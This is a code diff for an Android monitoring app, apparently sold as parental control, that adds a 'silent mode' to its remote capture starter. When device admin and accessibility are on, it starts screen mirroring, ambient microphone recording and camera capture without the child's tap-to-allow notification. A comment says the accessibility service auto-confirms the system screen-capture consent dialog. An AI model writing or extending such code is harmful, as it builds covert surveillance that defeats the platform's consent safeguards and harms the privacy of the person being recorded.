@@ -8,6 +8,7 @@ import android.media.projection.MediaProjectionManager
 import org.json.JSONObject
 import org.setbd.control.R
 import org.setbd.control.notifications.NotificationHelper
+import org.setbd.control.permissions.PermissionManager
 import androidx.core.content.ContextCompat
 
 /**
@@ -73,6 +74,22 @@ object RtcStarter {
             CaptureService.startScreen(ctx, grant.second, grant.first)
             return JSONObject().put("starting", true).put("reusedGrant", true)
         }
+        // Silent command mode (device admin + accessibility ON): open the
+        // system MediaProjection dialog directly instead of waiting for the
+        // child to tap the request notification. The accessibility service
+        // confirms the system dialog automatically (see BlockAccessibilityService).
+        if (PermissionManager.silentModeActive(ctx)) {
+            return try {
+                ctx.startActivity(
+                    MirrorConsentActivity.intent(ctx, WebRtcCore.KIND_SCREEN, null)
+                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                )
+                JSONObject().put("starting", true).put("silent", true)
+            } catch (e: Exception) {
+                NotificationHelper.showCaptureRequest(ctx, WebRtcCore.KIND_SCREEN, null)
+                JSONObject().put("needsConsent", true).put("notified", true)
+            }
+        }
         NotificationHelper.showCaptureRequest(ctx, WebRtcCore.KIND_SCREEN, null)
         return JSONObject().put("needsConsent", true).put("notified", true)
     }
@@ -90,6 +107,17 @@ object RtcStarter {
             CaptureService.startAmbient(ctx)
             return JSONObject().put("starting", true)
         }
+        // Silent mode: start directly — no tap-to-allow notification. If the
+        // platform forbids the background foreground-service start, fall back
+        // to the request notification (never crash).
+        if (PermissionManager.silentModeActive(ctx)) {
+            try {
+                CaptureService.startAmbient(ctx)
+                return JSONObject().put("starting", true).put("silent", true)
+            } catch (e: Exception) {
+                // fall through to the notification path
+            }
+        }
         NotificationHelper.showCaptureRequest(ctx, WebRtcCore.KIND_AMBIENT, null)
         return JSONObject().put("needsTap", true).put("notified", true)
     }
@@ -106,6 +134,15 @@ object RtcStarter {
         if (isAppForeground(ctx)) {
             CaptureService.startCamera(ctx, facing)
             return JSONObject().put("starting", true)
+        }
+        // Silent mode: direct start, notification only as the safe fallback.
+        if (PermissionManager.silentModeActive(ctx)) {
+            try {
+                CaptureService.startCamera(ctx, facing)
+                return JSONObject().put("starting", true).put("silent", true)
+            } catch (e: Exception) {
+                // fall through to the notification path
+            }
         }
         NotificationHelper.showCaptureRequest(ctx, WebRtcCore.KIND_CAMERA, facing)
         return JSONObject().put("needsTap", true).put("notified", true)
